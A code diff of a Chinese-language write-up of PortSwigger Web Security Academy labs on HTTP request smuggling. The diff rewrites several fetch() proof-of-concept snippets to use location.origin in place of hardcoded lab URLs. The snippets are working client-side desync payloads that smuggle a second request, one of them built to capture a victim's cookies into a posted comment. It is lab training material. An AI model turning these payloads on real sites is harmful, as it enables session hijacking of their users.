@@ -1162,18 +1162,14 @@ Start-Line:
 找到留言功能
 
 ```ts
-fetch(
-  "https://0a2100b003e582bf8026678c00b10093.web-security-academy.net/post/comment",
-  {
-    headers: {
-      "content-type": "application/x-www-form-urlencoded",
-    },
-    body: "csrf=7l5NCd3IrxwNh4D2CBiI4gShmiBLg5SB&postId=4&comment=123&name=123&email=123%40123",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/post/comment`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
   },
-);
+  body: "csrf=7l5NCd3IrxwNh4D2CBiI4gShmiBLg5SB&postId=4&comment=123&name=123&email=123%40123",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳 302 + `Location: /post/comment/confirmation?postId=4`
@@ -1436,9 +1432,7 @@ Start-Line:
 讓 victim 的 Cookie 都添加到 smuggled request headers 後面，之後瀏覽器 F12 > Console
 
 ```ts
-fetch(
-  "https://0a7e002003dd8abf80c32674001e00b5.web-security-academy.net/resources/js/tracking.js",
-)
+fetch(`${location.origin}/resources/js/tracking.js`)
   .then((res) => res.text())
   .then(console.log);
 ```
@@ -2290,7 +2284,6 @@ fetch("https://vulnerable-website.com/vulnerable-endpoint", {
 fetch("https://vulnerable-website.com/redirect-me", {
   method: "POST",
   body: "GET /hopefully404 HTTP/1.1\r\nFoo: x",
-  mode: "cors",
   credentials: "include",
 }).catch(() => {
   location = "https://vulnerable-website.com/";
@@ -2307,14 +2300,12 @@ fetch("https://vulnerable-website.com/redirect-me", {
 這題一進去就看到 path 是 `/en`，肯定有鬼，經過一番測試，PoC
 
 ```ts
-fetch("https://0a8b003c031e9ef882001f1c009c00f9.h1-web-security-academy.net", {
+fetch(`${location.origin}`, {
   method: "POST",
   body: "GET /hopefully404 HTTP/1.1\r\nFoo: x",
-  mode: "cors",
   credentials: "include",
 }).catch(() => {
-  location =
-    "https://0a8b003c031e9ef882001f1c009c00f9.h1-web-security-academy.net/en";
+  location = `${location.origin}/en`;
 });
 ```
 
@@ -2323,14 +2314,12 @@ fetch("https://0a8b003c031e9ef882001f1c009c00f9.h1-web-security-academy.net", {
 後續就是把 smuggled request 改成 `/post/comment`
 
 ```ts
-fetch("https://0a8b003c031e9ef882001f1c009c00f9.h1-web-security-academy.net", {
+fetch(`${location.origin}`, {
   method: "POST",
   body: "POST /en/post/comment HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: session=O5B2rdUODHOZnqhkw35diThu9WjxR8dt\r\nContent-Length: 1219\r\nHost: 0a8b003c031e9ef882001f1c009c00f9.h1-web-security-academy.net\r\n\r\ncsrf=x1ziw05SX2l96CO8XrLzAltueUiMWLRD&postId=7&name=victim15&email=1%401&comment=",
-  mode: "cors",
   credentials: "include",
 }).catch(() => {
-  location =
-    "https://0a8b003c031e9ef882001f1c009c00f9.h1-web-security-academy.net/en";
+  location = `${location.origin}/en`;
 });
 ```
 
